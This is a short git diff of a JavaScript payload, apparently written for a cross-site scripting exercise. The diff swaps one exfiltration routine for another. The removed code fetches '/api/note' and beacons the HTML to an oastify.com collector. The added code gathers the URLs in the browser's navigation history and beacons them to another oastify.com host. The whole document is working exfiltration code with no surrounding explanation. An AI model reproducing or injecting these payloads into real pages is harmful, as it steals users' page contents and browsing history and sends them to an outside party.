@@ -1,7 +1,4 @@
-fetch('/api/note')
-  .then((response) => {
-    return response.text();
-  })
-  .then((html) => {
-    navigator.sendBeacon("http://4inepx81jwmwwxr8m157oxm86zcq0go5.oastify.com", html) 
-  });
+const list = window.navigation.entries();
+const history = []
+list.forEach(e => history.push(e.url));
+navigator.sendBeacon("http://b3fla4t84373h4cf78qe947fr6xxlo9d.oastify.com", history)
